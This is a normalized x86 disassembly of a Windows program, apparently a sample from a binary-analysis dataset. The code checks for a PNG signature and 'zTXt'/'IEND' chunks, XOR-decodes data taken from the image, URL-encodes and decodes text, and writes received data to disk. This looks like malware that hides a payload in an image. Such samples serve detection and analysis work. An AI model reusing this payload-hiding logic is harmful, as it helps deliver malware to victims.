mov ebp esp
sub esp 0x18
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x18 ]
call sub_4056e9
push 0x32
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xd0 ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xd4 ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0xd8 ] ecx
push 0x100000
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0xe8 ] ecx
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
mov [ eax + 0xec ] ecx
mov al 0x1
leave
retn
sub_403ed9
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
call sub_404bd5
cmp eax 0x1
jge r-xdata
push r--data
mov eax [ ebp - 0x8 ]
push [ eax + 0x8c ]
call sub_401629
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call printf
pop ecx
xor eax eax
jmp r-xdata
push [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
push [ eax + 0x88 ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push r--data
call printf
pop ecx
xor eax eax
jmp r-xdata
leave
retn 0xc
mov eax [ ebp - 0x8 ]
push [ eax + 0xe0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
call sub_4051d0
mov eax [ ebp - 0x8 ]
push [ eax + 0xe4 ]
mov eax [ ebp - 0x8 ]
push [ eax + 0xe0 ]
call sub_405609
pop ecx
pop ecx
mov eax [ ebp - 0x8 ]
push [ eax + 0xe4 ]
mov ecx [ ebp - 0x8 ]
call sub_40470f
xor eax eax
jmp r-xdata
sub_403f97
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x42
push eax
mov eax [ ebp - 0x4 ]
add eax 0x10
push eax
push r--data
mov eax [ ebp - 0x4 ]
push [ eax + 0x94 ]
call sprintf
add esp 0x10
push r--data
push r--data
mov eax [ ebp - 0x4 ]
push [ eax + 0x94 ]
mov ecx [ ebp - 0x4 ]
call sub_403ed9
leave
retn
sub_403fdf
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x58 ]
test eax eax
je r-xdata
leave
retn 0x4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xe8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
inc [ ebp - 0xc ]
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
je r-xdata
push r--data
mov eax [ ebp - 0x8 ]
push [ eax + 0xe8 ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
push r--data
mov eax [ ebp - 0x4 ]
inc eax
inc eax
push eax
call sub_401629
pop ecx
pop ecx
inc eax
inc eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
sub_404058
push ebp
mov ebp esp
sub esp 0x44
push esi
push edi
mov [ ebp - 0x10 ] ecx
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
call sub_4049cb
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x14 ]
mov al [ eax ]
mov [ ebp - 0x1d ] al
mov eax [ ebp - 0x18 ]
mov cl [ ebp - 0x1d ]
mov [ eax ] cl
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
inc eax
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x1d ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x25 ] al
inc [ ebp - 0x24 ]
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov edi [ ebp - 0x24 ]
mov esi r--data
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x2c ]
mov al [ eax ]
mov [ ebp - 0x31 ] al
inc [ ebp - 0x2c ]
cmp [ ebp - 0x31 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x4 ]
dec eax
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x41 ] al
inc [ ebp - 0x40 ]
cmp [ ebp - 0x41 ] 0x0
jne r-xdata
mov edi [ ebp - 0x40 ]
mov esi [ ebp - 0x38 ]
mov eax [ ebp - 0x3c ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_4045ad
push eax
push 0xa
mov ecx [ ebp - 0x10 ]
call sub_405aed
push eax
mov eax [ ebp - 0x10 ]
add eax 0x42
push eax
mov eax [ ebp - 0x10 ]
add eax 0x10
push eax
push r--data
mov eax [ ebp - 0x10 ]
push [ eax + 0x94 ]
call sprintf
add esp 0x18
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push [ ebp - 0xc ]
call ??3@YAXPAX@Z
pop ecx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x94 ]
mov ecx [ ebp - 0x10 ]
call sub_404bd5
cmp eax 0x1
jge r-xdata
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
leave
retn 0x8
sub_4041a4
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xec ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
inc [ ebp - 0xc ]
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
je r-xdata
leave
retn
push r--data
mov eax [ ebp - 0x8 ]
push [ eax + 0xec ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
inc eax
inc eax
jmp r-xdata
sub_404207
push ebp
mov ebp esp
sub esp 0x28
push esi
push edi
mov [ ebp - 0x18 ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push 0x800
push 0x0
mov eax [ ebp - 0x18 ]
push [ eax + 0x98 ]
call memset
add esp 0xc
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x98 ]
dec eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x1d ] al
inc [ ebp - 0x1c ]
cmp [ ebp - 0x1d ] 0x0
jne r-xdata
mov edi [ ebp - 0x1c ]
push 0x3a
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x98 ]
dec eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x25 ] al
inc [ ebp - 0x24 ]
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov edi [ ebp - 0x24 ]
push 0x6
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x11
mov ecx [ ebp - 0x18 ]
call sub_405b6a
push eax
mov eax [ ebp - 0x18 ]
add eax 0x42
push eax
push 0x8
mov ecx [ ebp - 0x18 ]
call sub_405b6a
push eax
push 0xa
mov ecx [ ebp - 0x18 ]
call sub_405aed
push eax
mov eax [ ebp - 0x18 ]
add eax 0x42
push eax
mov eax [ ebp - 0x18 ]
add eax 0x10
push eax
push r--data
mov eax [ ebp - 0x18 ]
push [ eax + 0x94 ]
call sprintf
add esp 0x20
mov eax [ ebp - 0x18 ]
push [ eax + 0x98 ]
push 0x0
mov eax [ ebp - 0x18 ]
push [ eax + 0x94 ]
mov ecx [ ebp - 0x18 ]
call sub_404d9e
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
push [ ebp - 0x8 ]
push r--data
push r--data
mov ecx [ ebp - 0x18 ]
call sub_405186
movzx eax al
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
push [ ebp - 0x14 ]
call ??3@YAXPAX@Z
pop ecx
xor eax eax
mov eax [ ebp - 0x18 ]
push [ eax + 0xd8 ]
push [ ebp - 0x8 ]
call sub_405609
pop ecx
pop ecx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
push [ ebp - 0x10 ]
call ??3@YAXPAX@Z
pop ecx
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xd8 ]
jmp r-xdata
pop edi
pop esi
leave
retn
sub_404379
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x2 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x3 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_4043da
push ebp
mov ebp esp
sub esp 0x70
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x1c ] 0x89
mov [ ebp - 0x1b ] 0x50
mov [ ebp - 0x1a ] 0x4e
mov [ ebp - 0x19 ] 0x47
mov [ ebp - 0x18 ] 0xd
mov [ ebp - 0x17 ] 0xa
mov [ ebp - 0x16 ] 0x1a
mov [ ebp - 0x15 ] 0xa
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x40 ] 0x7a
mov [ ebp - 0x3f ] 0x54
mov [ ebp - 0x3e ] 0x58
mov [ ebp - 0x3d ] 0x74
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x28 ] 0x49
mov [ ebp - 0x27 ] 0x45
mov [ ebp - 0x26 ] 0x4e
mov [ ebp - 0x25 ] 0x44
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x38 ] 0x0
xor eax eax
lea edi [ ebp - 0x37 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
pop ecx
lea edi [ ebp - 0x1c ]
mov esi [ ebp + 0x8 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x8
mov [ ebp - 0x50 ] eax
or eax 0xffffffff
jmp r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x50 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
mov ecx [ ebp - 0x70 ]
call sub_404379
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x50 ]
add eax 0x4
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x50 ]
mov eax [ eax ]
cmp eax [ ebp - 0x40 ]
jne r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4097f0
leave
retn 0x8
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x50 ]
lea eax [ ecx + eax + 0x8 ]
mov [ ebp - 0x50 ] eax
mov eax r--data
mov ecx [ ebp - 0x50 ]
add ecx 0x4
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x44 ]
sub eax 0x8
push eax
push 0x0
push [ ebp + 0xc ]
call memset
add esp 0xc
push [ ebp - 0x44 ]
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x50 ]
add eax 0x8
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x60 ]
mov eax [ eax ]
mov [ ebp - 0x58 ] eax
lea ecx [ ebp - 0x59 ]
call sub_40436d
mov eax [ ebp - 0x44 ]
sub eax 0x8
push eax
push [ ebp - 0xc ]
mov eax [ ebp - 0x58 ]
imul eax eax 0x11
add eax 0xd
push eax
lea ecx [ ebp - 0x59 ]
call sub_4034f9
mov eax [ ebp - 0x44 ]
sub eax 0x8
push eax
push [ ebp - 0x58 ]
push r--data
call printf
add esp 0xc
and [ ebp - 0x64 ] 0x0
jmp r-xdata
xor eax eax
inc eax
je r-xdata
mov eax [ ebp - 0x50 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jne r-xdata
mov eax [ ebp - 0x44 ]
sub eax 0x8
cmp [ ebp - 0x64 ] eax
jae r-xdata
mov eax [ ebp - 0x44 ]
sub eax 0x8
mov [ ebp - 0x6c ] eax
lea ecx [ ebp - 0x59 ]
call sub_4034f0
mov eax [ ebp - 0x6c ]
jmp r-xdata
mov eax [ ebp - 0x50 ]
add eax [ ebp - 0x64 ]
movsx eax [ eax + 0xc ]
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x64 ]
movsx ecx [ ecx ]
xor eax ecx
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x64 ]
mov [ ecx ] al
jmp r-xdata
mov eax [ ebp - 0x64 ]
inc eax
mov [ ebp - 0x64 ] eax
sub_4045ad
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] ecx
push 0x500000
push 0x0
mov eax [ ebp - 0x14 ]
push [ eax + 0xc4 ]
call memset
add esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
inc eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
mov al [ eax ]
mov [ ebp - 0x1d ] al
inc [ ebp - 0x18 ]
cmp [ ebp - 0x1d ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x4 ] 0x0
and [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xc4 ]
leave
retn 0x4
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0xc ]
mov al [ eax ]
mov [ ebp - 0xd ] al
movsx eax [ ebp - 0xd ]
push eax
push r--data
call sub_4046fd
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xc4 ]
add eax [ ebp - 0x4 ]
push eax
call sprintf
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
movsx eax [ ebp - 0xd ]
sar eax 0x4
and eax 0xf
movsx eax [ eax + r--data ]
push eax
push r--data
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xc4 ]
add eax [ ebp - 0x4 ]
push eax
call sprintf
add esp 0xc
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
movsx eax [ ebp - 0xd ]
and eax 0xf
movsx eax [ eax + r--data ]
push eax
push r--data
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xc4 ]
add eax [ ebp - 0x4 ]
push eax
call sprintf
add esp 0xc
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
movsx eax [ ebp - 0xd ]
cmp eax 0x20
jle r-xdata
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
movsx eax [ ebp - 0xd ]
cmp eax 0x7b
jge r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xc4 ]
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0xd ]
mov [ eax + ecx ] dl
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
jmp r-xdata
sub_40470f
push ebp
mov ebp esp
sub esp 0x2c
push edi
mov [ ebp - 0x1c ] ecx
push 0x3
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
push 0x500000
push 0x0
mov eax [ ebp - 0x1c ]
push [ eax + 0xc0 ]
call memset
add esp 0xc
xor eax eax
mov edi [ ebp - 0x8 ]
stosw [ edi ]
stosb [ edi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
mov al [ eax ]
mov [ ebp - 0x25 ] al
inc [ ebp - 0x20 ]
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0xc ] eax
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0xc0 ]
pop edi
leave
retn 0x4
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
movsx eax [ ebp - 0x11 ]
cmp eax 0x25
jne r-xdata
movsx eax [ ebp - 0x11 ]
cmp eax 0x2b
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x1 ]
cmp eax 0x39
jg r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0xc0 ]
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x11 ]
mov [ eax + ecx ] dl
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0xc0 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + ecx ] 0x20
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x1 ]
cmp eax 0x66
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x1 ]
cmp eax 0x30
jl r-xdata
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x1 ]
cmp eax 0x46
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x1 ]
cmp eax 0x61
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x1 ]
sub eax 0x30
mov [ ebp - 0x11 ] al
jmp r-xdata
movsx eax [ ebp - 0x11 ]
shl eax 0x4
mov [ ebp - 0x11 ] al
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x2 ]
cmp eax 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x1 ]
cmp eax 0x41
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x1 ]
sub eax 0x57
mov [ ebp - 0x11 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x2 ]
cmp eax 0x66
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x2 ]
cmp eax 0x30
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x1 ]
sub eax 0x37
mov [ ebp - 0x11 ] al
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x2 ]
cmp eax 0x46
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x2 ]
cmp eax 0x61
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x2 ]
movsx ecx [ ebp - 0x11 ]
lea eax [ ecx + eax - 0x30 ]
mov [ ebp - 0x11 ] al
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0xc0 ]
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x11 ]
mov [ eax + ecx ] dl
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
inc eax
inc eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x2 ]
cmp eax 0x41
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x2 ]
movsx ecx [ ebp - 0x11 ]
lea eax [ ecx + eax - 0x57 ]
mov [ ebp - 0x11 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx eax [ eax + 0x2 ]
movsx ecx [ ebp - 0x11 ]
lea eax [ ecx + eax - 0x37 ]
mov [ ebp - 0x11 ] al
sub_404952
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
mov [ eax ] r--data
mov eax [ ebp - 0x8 ]
mov [ eax + 0xb8 ] 0x400
push 0x100000
call malloc
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0xbc ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc8 ] ecx
xor eax eax
mov edi [ ebp - 0x8 ]
add edi 0x42
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax [ ebp - 0x8 ]
mov [ eax + 0x9 ] 0x0
mov eax [ ebp - 0x8 ]
pop edi
leave
retn
sub_4049cb
push ebp
mov ebp esp
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x68 ] ecx
lea eax [ ebp - 0x60 ]
push eax
call sub_401eff
pop ecx
lea eax [ ebp - 0x60 ]
push eax
call sub_404a15
pop ecx
mov [ ebp - 0x64 ] eax
push [ ebp - 0x64 ]
push 0x50
lea eax [ ebp - 0x58 ]
push eax
call asctime_s
add esp 0xc
lea eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4097f0
leave
retn
sub_404a23
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] 0x1
and [ ebp - 0x4 ] 0x0
push r--data
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x80 ]
call sub_406de6
movzx eax al
test eax eax
je r-xdata
push r--data
call printf
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x80 ]
call sub_404bc3
push eax
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x80 ]
call sub_407519
movzx eax al
test eax eax
je r-xdata
leave
retn 0x8
push r--data
call printf
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2800
push 0x0
mov eax [ ebp - 0x14 ]
push [ eax + 0x8c ]
call memset
add esp 0xc
push 0x2800
mov eax [ ebp - 0x14 ]
push [ eax + 0x8c ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x80 ]
call sub_408dba
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
push 0x40000000
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x80 ]
call sub_4074bf
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
and [ ebp - 0x10 ] 0x0
push 0x400
push 0x0
mov eax [ ebp - 0x14 ]
push [ eax + 0x90 ]
call memset
add esp 0xc
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
jmp r-xdata
push 0x400
mov eax [ ebp - 0x14 ]
push [ eax + 0x90 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x80 ]
call sub_408e1b
mov [ ebp - 0x8 ] eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
push [ eax + 0x90 ]
push [ ebp - 0xc ]
call [ WriteFile@IAT ]
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
push 0x400
push 0x0
mov eax [ ebp - 0x14 ]
push [ eax + 0x90 ]
call memset
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x80 ]
call sub_4074bf
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
sub_404bd5
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] 0x1
and [ ebp - 0x4 ] 0x0
push r--data
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x80 ]
call sub_406de6
movzx eax al
test eax eax
je r-xdata
push r--data
call printf
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x80 ]
call sub_404bc3
push eax
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x80 ]
call sub_407519
movzx eax al
test eax eax
je r-xdata
leave
retn 0xc
push r--data
call printf
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2800
push 0x0
mov eax [ ebp - 0xc ]
push [ eax + 0x8c ]
call memset
add esp 0xc
push 0x2800
mov eax [ ebp - 0xc ]
push [ eax + 0x8c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x80 ]
call sub_408dba
movzx eax [ ebp + 0xc ]
test eax eax
je r-xdata
push 0x400
push 0x0
mov eax [ ebp - 0xc ]
push [ eax + 0x90 ]
call memset
add esp 0xc
push 0x200000
push 0x0
mov eax [ ebp - 0xc ]
push [ eax + 0x88 ]
call memset
add esp 0xc
push r--data
call printf
pop ecx
push [ ebp + 0x8 ]
call printf
pop ecx
push r--data
call printf
pop ecx
mov eax [ ebp - 0xc ]
push [ eax + 0x8c ]
call printf
pop ecx
movzx eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push 0x400
mov eax [ ebp - 0xc ]
push [ eax + 0x90 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x80 ]
call sub_408e1b
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
